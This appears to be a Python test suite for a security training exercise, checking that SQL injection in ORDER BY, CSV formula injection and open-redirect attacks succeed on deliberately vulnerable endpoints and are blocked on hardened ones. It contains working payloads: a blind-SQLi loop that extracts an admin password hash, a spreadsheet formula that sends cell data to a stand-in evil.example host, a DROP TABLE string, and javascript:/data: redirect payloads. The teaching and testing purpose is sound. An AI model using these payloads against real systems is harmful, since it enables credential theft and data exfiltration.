"""Desafío etapa 1: cada ataque funciona en /vuln y queda bloqueado o neutralizado en /secure."""

import pytest

from app.db import get_conn


@pytest.fixture()
def seeded():
    """Garantiza varios comentarios con autores distintos para poder comparar órdenes."""
    with get_conn() as conn:
        for author, body in [("zoe", "z"), ("bruno", "b"), ("carla", "c")]:
            conn.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))


# ── Reto 1: inyección en ORDER BY ───────────────────────────────────────────

ORACLE = "(CASE WHEN (SELECT substr(password_hash, {pos}, 1) FROM users WHERE username = 'admin') = '{ch}' THEN id ELSE -id END)"


def _ids(response):
    return [row["id"] for row in response.json()]


def test_reto1_case_when_cambia_el_orden(client, seeded):
    verdadero = _ids(client.get("/vuln/comments/sorted", params={"sort": ORACLE.format(pos=1, ch="p")}))
    falso = _ids(client.get("/vuln/comments/sorted", params={"sort": ORACLE.format(pos=1, ch="x")}))
    assert verdadero == sorted(verdadero)  # condición verdadera -> ascendente
    assert falso == sorted(falso, reverse=True)  # condición falsa -> descendente
    assert verdadero != falso


def test_reto1_blind_sqli_extrae_el_prefijo_del_hash(client, seeded):
    """El oráculo booleano alcanza para leer el hash carácter por carácter."""
    alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789_$"
    extraido = ""
    for pos in range(1, 14):
        for ch in alfabeto:
            ids = _ids(client.get("/vuln/comments/sorted", params={"sort": ORACLE.format(pos=pos, ch=ch)}))
            if ids == sorted(ids):
                extraido += ch
                break
    assert extraido == "pbkdf2_sha256"


@pytest.mark.parametrize(
    "params",
    [
        {"sort": ORACLE.format(pos=1, ch="p")},
        {"sort": "id; DROP TABLE comments"},
        {"sort": "body"},
        {"direction": "asc, (SELECT 1)"},
        {"direction": "sideways"},
        {"sort": "author", "direction": "desc--"},
    ],
)
def test_reto1_secure_rechaza_fuera_de_allowlist(client, seeded, params):
    assert client.get("/secure/comments/sorted", params=params).status_code in (400, 422)


def test_reto1_secure_ordena_por_autor_desc(client, seeded):
    rows = client.get("/secure/comments/sorted", params={"sort": "author", "direction": "desc"}).json()
    autores = [r["author"] for r in rows]
    assert autores == sorted(autores, reverse=True)


@pytest.mark.parametrize("direction", ["ASC", "Desc", "dEsC"])
def test_reto1_secure_direccion_sin_importar_mayusculas(client, seeded, direction):
    rows = client.get("/secure/comments/sorted", params={"sort": "id", "direction": direction}).json()
    ids = [r["id"] for r in rows]
    assert ids == sorted(ids, reverse=direction.lower() == "desc")


# ── Reto 2: CSV injection ───────────────────────────────────────────────────

import csv  # noqa: E402
import io  # noqa: E402

HYPERLINK = '=HYPERLINK("https://evil.example/?d="&A1,"Ver detalle")'


def _parse_csv(text):
    return list(csv.reader(io.StringIO(text)))


def test_reto2_vuln_exporta_formula_cruda(client):
    client.post("/vuln/comments", json={"author": "mallory", "body": HYPERLINK})
    lines = client.get("/vuln/comments/export.csv").text.splitlines()
    assert any(any(cell.startswith("=HYPERLINK(") for cell in line.split(",")) for line in lines)


def test_reto2_vuln_comas_y_saltos_rompen_la_estructura(client):
    client.post("/vuln/comments", json={"author": "eve", "body": "uno,dos,tres\nfila,fantasma"})
    rows = _parse_csv(client.get("/vuln/comments/export.csv").text)
    assert any(len(r) != 2 for r in rows)  # aparecen columnas o filas que no existen


def test_reto2_secure_neutraliza_formulas(client):
    client.post("/vuln/comments", json={"author": "mallory", "body": HYPERLINK})
    rows = _parse_csv(client.get("/secure/comments/export.csv").text)
    bodies = [r[1] for r in rows[1:]]
    assert "'" + HYPERLINK in bodies
    assert not any(cell.startswith(("=", "+", "-", "@", "\t", "\r")) for r in rows for cell in r)


@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
def test_reto2_secure_todos_los_disparadores(client, trigger):
    body = trigger + "1+1"
    client.post("/vuln/comments", json={"author": "trigger", "body": body})
    bodies = [r[1] for r in _parse_csv(client.get("/secure/comments/export.csv").text)[1:]]
    assert "'" + body in bodies


def test_reto2_secure_comas_y_saltos_no_rompen_filas(client):
    body = 'uno,dos,"tres"\nfila,fantasma'
    client.post("/secure/comments", json={"author": "eve", "body": body})
    rows = _parse_csv(client.get("/secure/comments/export.csv").text)
    assert all(len(r) == 2 for r in rows)  # siempre author y body
    assert ["eve", body] in rows  # y el valor vuelve intacto


def test_reto2_secure_texto_normal_sin_cambios(client):
    client.post("/secure/comments", json={"author": "nico", "body": "Todo bien, gracias!"})
    rows = _parse_csv(client.get("/secure/comments/export.csv").text)
    assert ["nico", "Todo bien, gracias!"] in rows


def test_reto2_encoder_unitario():
    from app.encoding import spreadsheet_cell

    assert spreadsheet_cell("=1+1") == "'=1+1"
    assert spreadsheet_cell("-5") == "'-5"
    assert spreadsheet_cell("hola = chau") == "hola = chau"
    assert spreadsheet_cell("") == ""


# ── Reto 3: open redirect ───────────────────────────────────────────────────


def _location(client, base, target):
    response = client.get(f"{base}/redirect", params={"next": target}, follow_redirects=False)
    assert response.status_code == 302
    return response.headers["location"]


@pytest.mark.parametrize("target", ["https://evil.example/login", "//evil.example", "/\\evil.example"])
def test_reto3_vuln_redirige_afuera(client, target):
    location = _location(client, "/vuln", target)
    assert "evil.example" in location


@pytest.mark.parametrize(
    "target",
    [
        "https://evil.example",
        "https://evil.example/login",
        "//evil.example",
        "/\\evil.example",
        "\\\\evil.example",
        "/%2F%2Fevil.example",
        "/%5Cevil.example",
        "javascript:alert(document.domain)",
        "JaVaScRiPt:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "https:evil.example",
        "/\t/evil.example",
        "/\r\n/evil.example",
        "evil.example",
        "/app/../vuln/redirect?next=https://evil.example",
        "/app/%2e%2e/vuln/redirect",
        "/vuln/comments",
        "",
    ],
)
def test_reto3_secure_rechaza_y_vuelve_al_inicio(client, target):
    assert _location(client, "/secure", target) == "/"


@pytest.mark.parametrize("target", ["/secure/comments", "/secure/comments?filter=x", "/app/", "/app/#alice", "/"])
def test_reto3_secure_respeta_destinos_validos(client, target):
    assert _location(client, "/secure", target) == target
